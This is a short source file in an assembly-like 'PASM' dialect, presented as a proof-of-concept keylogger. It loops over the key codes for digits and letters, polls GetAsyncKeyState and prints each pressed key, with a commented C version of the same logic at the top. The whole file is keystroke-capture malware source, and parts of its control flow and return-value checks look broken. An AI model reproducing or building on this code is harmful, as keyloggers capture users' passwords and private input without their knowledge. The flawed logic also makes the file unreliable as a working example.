; Simple PASM keylogger POC
; by patate

; //https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes

; -----------------------------------
; Keys 0 to 9 and A to Z
; -----------------------------------
; for (int i = 48; i < 91; i++) {
;     if (i >= 58 && i <= 64) {
;       continue;
;      }
;     if (GetAsyncKeyState(i)) {
;       printf("%c", i);
;     }
; }


loop:

mov a1, 47 ;set a1 to 47

numbers:
cmp a1, 90
je loop ; if ==

call check
cmp eax, 1
je inc_and_numbers

add a1, 1 ; i++

push a1 ; arg 1 (vKey)
call GetAsyncKeyState
cmp eax, 1
jne numbers ; if GetAsyncKeyState was false, jump to numbers

mov a2, a1 ; necessary ?
push "%c" ; push format
push a2 ; push char
call printf
jmp numbers

; https://stackoverflow.com/a/18670716
check:
cmp a1, 58
jb return ; if <

cmp a1, 64
ja return ; if >

mov eax, 1
ret

inc_and_numbers:
add a1, 1
call numbers

return:
ret